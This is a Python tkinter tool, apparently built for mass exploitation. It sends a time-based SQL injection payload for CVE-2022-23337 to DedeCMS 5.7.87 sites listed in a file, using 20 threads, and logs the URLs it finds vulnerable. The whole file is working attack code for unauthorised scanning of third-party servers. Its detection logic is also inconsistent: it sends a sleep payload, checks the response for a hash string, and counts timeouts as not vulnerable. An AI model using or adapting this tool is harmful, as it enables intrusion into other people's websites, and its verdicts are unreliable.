import requests
import tkinter as tk
from tkinter import *
from PIL.ImageTk import PhotoImage
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def dede_sql_exp(url):
    poc = r"""/dede/article_coonepage_rule.php?action=del&ids=2,1)%20or%20sleep(3)%23"""
    url = url + poc
    try:
        res = requests.get(url, timeout=3)
        if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
            dedesql_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
            dedesql_text.see(END)
            with open ("[exists]Dede_CVE_2022_23337_url.txt", 'a') as f:
                f.write(url + "\n")
    except:
        dedesql_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
        dedesql_text.see(END)
def get_dede_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def dedesql_gui():
    dedesql = tk.Tk()
    dedesql.geometry("1035x455")
    dedesql.title("Dede v5.7.87 SQLinjection(CVE-2022-23337) [auto-muti-exp]")
    dedesql.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    dedesql.tk.call('wm', 'iconphoto', dedesql._w, logo)
    global dedesql_text
    dedesql_text = scrolledtext.ScrolledText(dedesql,width=123, height=25)
    dedesql_text.grid(row=0, column=0, padx=10, pady=10)
    dedesql_text.see(END)
    addrs = get_dede_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(dede_sql_exp, addr)
    dedesql.mainloop()